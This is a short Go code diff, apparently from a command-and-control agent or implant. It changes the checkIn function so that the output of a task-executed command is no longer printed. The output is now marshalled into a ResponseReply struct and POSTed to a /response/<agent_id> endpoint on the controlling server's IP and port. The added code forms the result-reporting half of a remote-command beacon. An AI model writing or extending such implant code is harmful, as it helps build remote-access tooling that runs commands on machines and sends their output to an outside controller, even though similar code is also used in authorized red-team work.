@@ -15,7 +15,7 @@ type CheckInResponses struct {
 	Task string `json:"task"`
 }
 
-type CheckInReply struct {
+type ResponseReply struct {
 	ID     string `json:"id"`
 	Task   string `json:"task"`
 	Output string `json:"output"`
@@ -80,6 +80,29 @@ func checkIn(ip string, port string, agent_id string) bool {
 		}
 	}
 
-	fmt.Printf("%s", cmd_response)
+	if cmd_response != "" {
+		newUrl := fmt.Sprintf("https://%s:%s/response/%s", ip, port, agent_id)
+
+		responseReply := ResponseReply{
+			ID:     response.ID,
+			Task:   response.Task,
+			Output: cmd_response,
+		}
+
+		jsonValue, err := json.Marshal(responseReply)
+		if err != nil {
+			fmt.Printf("[-] Failed to marshal JSON: %v\n", err)
+			return false
+		}
+
+		// ✅ Properly send the request and handle errors
+		resp, err := client.Post(newUrl, "application/json", strings.NewReader(string(jsonValue)))
+		if err != nil {
+			fmt.Printf("[-] Failed to send response: %v\n", err)
+			return false
+		}
+		defer resp.Body.Close()
+
+	}
 	return true
 }
